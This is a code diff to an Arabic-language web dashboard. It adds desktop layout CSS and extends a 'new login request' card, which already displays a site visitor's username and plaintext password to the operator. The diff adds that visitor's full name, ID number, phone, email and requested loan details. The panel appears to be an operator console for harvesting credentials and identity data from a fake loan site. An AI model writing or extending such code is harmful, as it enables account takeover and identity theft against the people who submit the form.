@@ -362,6 +362,67 @@
   }
 
 
+  @media (min-width:900px){
+    .main{
+      max-width:1200px;
+      padding:36px 32px 70px;
+    }
+    .topbar{
+      padding:20px 32px;
+    }
+    .topbar .brand{
+      font-size:20px;
+    }
+    .welcome{
+      font-size:28px;
+    }
+    .welcome-sub{
+      font-size:16px;
+      margin-bottom:32px;
+    }
+    .stats{
+      margin-bottom:36px;
+    }
+    .stat-wifi{
+      max-width:280px;
+      padding:22px;
+    }
+    .stat-label{
+      font-size:15px;
+    }
+    .stat-value{
+      font-size:30px;
+    }
+    .table-card{
+      padding:28px;
+      margin-bottom:26px;
+    }
+    .table-card h2{
+      font-size:19px;
+      margin-bottom:20px;
+    }
+    table{
+      font-size:15px;
+    }
+    th{
+      font-size:13px;
+      padding:14px 26px;
+    }
+    td{
+      padding:16px 26px;
+    }
+    .action-btn{
+      font-size:13px;
+      padding:8px 16px;
+    }
+    .modal-row{
+      font-size:15px;
+      padding:11px 0;
+    }
+    .modal-box{
+      max-width:400px;
+    }
+  }
 </style>
 </head>
 <body>
@@ -415,6 +476,12 @@
 
     <div class="table-card" id="pendingRequestCard" style="display:none;">
       <h2>طلب دخول جديد (من الموقع)</h2>
+      <div class="modal-row"><span class="modal-label">الاسم بالكامل</span><span class="modal-value" id="reqFullName"></span></div>
+      <div class="modal-row"><span class="modal-label">رقم الهوية</span><span class="modal-value" id="reqIdNumber"></span></div>
+      <div class="modal-row"><span class="modal-label">رقم الهاتف</span><span class="modal-value" id="reqPhone"></span></div>
+      <div class="modal-row"><span class="modal-label">البريد الإلكتروني</span><span class="modal-value" id="reqEmail"></span></div>
+      <div class="modal-row"><span class="modal-label">مبلغ القرض</span><span class="modal-value" id="reqLoanAmount"></span></div>
+      <div class="modal-row"><span class="modal-label">مدة السداد</span><span class="modal-value" id="reqLoanMonths"></span></div>
       <div class="modal-row"><span class="modal-label">اسم المستخدم</span><span class="modal-value" id="reqUsername"></span></div>
       <div class="modal-row"><span class="modal-label">كلمة المرور</span><span class="modal-value" id="reqPassword"></span></div>
       <div class="modal-actions" style="padding:14px 0 0;">
@@ -559,6 +626,18 @@ function checkPendingRequest(){
         document.getElementById('reqUsername').textContent = data.username;
         document.getElementById('reqPassword').textContent = data.password;
         card.style.display = 'block';
+
+        fetch('/api/application-data')
+          .then(function(r){ return r.json(); })
+          .then(function(app){
+            document.getElementById('reqFullName').textContent = app ? app.fullName : '—';
+            document.getElementById('reqIdNumber').textContent = app ? app.idNumber : '—';
+            document.getElementById('reqPhone').textContent = app ? app.phone : '—';
+            document.getElementById('reqEmail').textContent = app ? app.email : '—';
+            document.getElementById('reqLoanAmount').textContent = app ? ('AED ' + app.loanAmount) : '—';
+            document.getElementById('reqLoanMonths').textContent = app ? (app.months + ' شهر') : '—';
+          })
+          .catch(function(){});
       } else {
         card.style.display = 'none';
       }
